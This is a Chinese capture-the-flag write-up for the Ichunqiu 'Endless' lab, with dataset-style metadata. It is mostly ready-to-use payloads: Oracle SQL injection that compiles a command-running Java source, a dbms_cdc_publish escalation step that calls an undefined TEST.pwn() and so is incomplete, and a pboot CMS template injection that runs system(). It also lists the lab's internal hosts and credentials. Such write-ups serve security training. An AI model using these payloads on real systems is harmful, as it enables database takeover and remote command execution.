---
title: Ichunqiu 云境 —— Endless (无间计划) Writeup
contest: Ichunqiu 云境
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [Oracle, Java Source 注入, dbms_xmlquery, 域渗透, 提权, dbms_cdc_publish]
attack_chain: |
  1. 入口: Oracle SQL 注入 (admin' and (select dbms_xmlquery.newcontext('...') from dual)>1 --) → 创建 Java Source "LinxUtil" + runCMD(String args) 反射 Runtime.getRuntime().exec(args).getInputStream()
  2. 提权: dbms_cdc_publish.create_change_set 调 java 反射执行 LINXRUNCMD → execute immediate 提权
  3. 创建函数: create or replace function LINXRUNCMD(p_cmd in varchar2) return varchar2 as language java name 'LinxUtil.runCMD(java.lang.String) return String';
  4. 触发命令: admin' union select null,(select LINXRUNCMD('whoami') from dual),null from dual--
  5. 二阶段: pboot CMS 后台 GET /?a=}{pboot{user:password}:if(("sysx74em")("whoami"));//)}xxx{/pboot{user:password}:if} → Cookie 注入 + 任意命令执行
  6. 内网: 172.24.7.5 DCadmin.pen.me (DC) / 172.24.7.48 / 172.24.7.16 / 172.24.7.3 (DC) / 172.24.7.43 / 172.24.7.27:8090 confluence / 172.24.7.23 gitlab
  7. 凭据: usera@pentest.com Admin3gv83 / SQL Server sa sqlserver_2022
key_payload: |
  # 1. 创建 Java Source:
  admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream()) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual)>1 --
  
  # 2. 提权 (dbms_cdc_publish 反向调用):
  admin' AND (SELECT dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set(''''a'''',''''a'''',''''a''''''''||TEST.pwn()||''''''''a'''',''''Y'''',s ysdate,sysdate);end;''; commit; end;') from dual)>1--
  
  # 3. 创建函数:
  admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LINXRUNCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual)>1 --
  
  # 4. 命令执行:
  admin' union select null,(select LINXRUNCMD('whoami') from dual),null from dual--
one_liner: Oracle 注入 + Java Source 创建 + dbms_cdc_publish 提权 + pboot CMS 后台命令执行 + 大型内网域渗透拓扑。
lesson: |
  - Oracle dbms_xmlquery.newcontext 接受任意 PL/SQL 块是 SQL 注入 → RCE 的金钥匙
  - create or replace java source named "X" 注入 Java 静态方法，再 create function 包装为 SQL 函数 LINXRUNCMD
  - dbms_cdc_publish.create_change_set 是低权限绕过 Java 权限沙箱的常见入口
  - pboot CMS 的 {pboot:if} 模板标签可以执行任意 PHP 函数，Cookie lg=cn 改后绕过区域检查
  - 大型内网域渗透 (confluence/gitlab/DCadmin/SQL Server) 拓扑典型化
quality: high
---

# Ichunqiu 云境 —— Endless (无间计划) Writeup

> 来源: ctfiot.com 105171

## 0x01 Oracle SQL 注入 → Java Source RCE

```sql
-- 1. 创建 Java Source "LinxUtil" 内含 runCMD(String args):
admin' and (select dbms_xmlquery.newcontext('
  declare PRAGMA AUTONOMOUS_TRANSACTION;
  begin execute immediate ''
    create or replace and compile java source named "LinxUtil" as
    import java.io.*;
    public class LinxUtil extends Object {
      public static String runCMD(String args) {
        try {
          BufferedReader myReader = new BufferedReader(
            new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));
          String stemp,str="";
          while ((stemp = myReader.readLine()) != null) str += stemp+"\n";
          myReader.close();
          return str;
        } catch (Exception e) { return e.toString(); }
      }
    }
  '';
  commit;
  end;
') from dual)>1 --

-- 2. 提权 (dbms_cdc_publish 反向调用):
admin' AND (SELECT dbms_xmlquery.newcontext('
  declare PRAGMA AUTONOMOUS_TRANSACTION;
  begin execute immediate ''
    begin sys.dbms_cdc_publish.create_change_set(
      ''''a'''', ''''a'''',
      ''''a''''''''||TEST.pwn()||''''''''a'''',
      ''''Y'''', sysdate, sysdate);
  end;
  '';
  commit;
  end;
') from dual)>1--

-- 3. 包装为 SQL 函数:
admin' and (select dbms_xmlquery.newcontext('
  declare PRAGMA AUTONOMOUS_TRANSACTION;
  begin execute immediate ''
    create or replace function LINXRUNCMD(p_cmd in varchar2) return varchar2
    as language java name ''''LinxUtil.runCMD(java.lang.String) return String'''';
  '';
  commit;
  end;
') from dual)>1 --

-- 4. 触发命令:
admin' union select null,(select LINXRUNCMD('whoami') from dual),null from dual--
```

## 0x02 pboot CMS 后台命令执行

```http
GET /?a=}{pboot{user:password}:if(("sysx74em")("whoami"));//)}xxx{/pboot{user:password}:if} HTTP/1.1
Host: 39.98.94.70:80
Cookie: lg=cn; PbootSystem=h6o5ta1btl6o32bi184ula183l
```

pboot CMS 的 `{pboot:if}` 模板标签可以执行任意 PHP 函数，注入 `("sysx74em")("whoami")` → 调用 system("whoami")。

## 0x03 内网拓扑

```
172.24.7.5   DCadmin.pen.me       (DC, 未拿下)
172.24.7.48  IZAYSXE6VCUHB4Z.pentest.me  (在范围内)
172.24.7.16  IZMN9U6ZO3VTRNZ.pentest.me  (在范围内, 已拿下)
172.24.7.3   DC.pentest.me        (DC, 在范围内)
172.24.7.43  IZMN9U6ZO3VTRPZ.pentest.me
172.24.7.27  confluence:8090
172.24.7.23  gitlab
```

**凭据：**
- `usera@pentest.com / Admin3gv83`
- SQL Server: `sa / sqlserver_2022` (172.26.8.16)

## 评价

云境系列的"渗透大型内网"经典题型，Oracle 注入 → Java Source RCE → pboot CMS 模板注入 → 内网域渗透 + SQL Server sa 横向。

`dbms_xmlquery.newcontext` + `create or replace java source` + `dbms_cdc_publish` 三段连招是 Oracle 注入 → RCE 的"标准答案"，值得背熟。

`pboot{if}` 模板标签注入是国 CMS 的常见漏洞面。
